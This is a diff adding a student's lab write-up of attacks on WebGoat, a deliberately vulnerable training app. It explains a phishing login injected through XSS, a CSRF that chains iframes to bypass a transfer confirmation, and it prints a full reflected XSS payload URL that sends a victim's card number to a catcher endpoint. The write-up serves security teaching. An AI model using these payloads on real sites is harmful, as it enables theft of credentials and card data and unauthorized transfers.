@@ -1,0 +1,40 @@
+#Weizhou Wang, 1004421262, weizhou.wang@mail.utoronto.ca
+#Jiabo Cui, ,
+
+Part 1 Explanation:
+After testing, we found that the input text bar is able to run our html code and 
+javascript functions by inserting the code into the text bar, which is a vunlnerability. 
+Therefore, we inserted a fake login region to phish the victim input his/her username 
+and password. After the victim pressed the "Login" button, the javascript function is 
+called and the victim's credentials in the form will be uploaded to the catcher servlet by an HTTP-POST 
+request. After everything is done, the script will print "Successfully Logged in!" message 
+to pretend normal.
+
+Part 2 Explanation:
+The field that allows users to input their three-digit codes is vunlnerable and exploitable, as the server
+does not check the input to not contain javascript. As a result, the javascript will be injected into the 
+location of the innerHTML region of the "message" element. Since when the victim clicks the button, he/she 
+has entered the card number to the input named "input2". Therefore, we can use getElementsByName() to get 
+the number. In additon, since the javascript is injected into the webpage, it is run from the website itself,
+so the same origin policy is not violated and we can access any element on the webpage.
+
+Unencoded URL:
+http://localhost:8090/WebGoat/start.mvc#attack/SCREEN_ID/900?input1=na&input2=<script>
+    document.getElementsByName("input2")[0].value = "000";
+    document.getElementsByName("buy")[0].addEventListener('click', function() {
+        var cardnumber = document.getElementsByName("input1")[0].value;
+        var url = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolen-credit-card=" + cardnumber;
+        var xhttp = new XMLHttpRequest();
+        xhttp.open("POST", url, false);
+        xhttp.send();
+    });
+    document.getElementById("message").innerHTML="";
+</script>
+
+Part 3 Explanation:
+The Message field is exploitable.
+We created two iframes, where the first one has a src that requests a fund transfer, and the second one has an
+empty src initially. After the first iframe is loaded, i.e. the first request is sent, it uses the "onload" event
+handler to run a javascript to overwrite the src of the second iframe by the URL that confirms the transfer prompt. 
+As a result, the two requests will be sent in order, as the onload handler will wait until the first one is completed,
+and the prompt is by-passed by the second request.
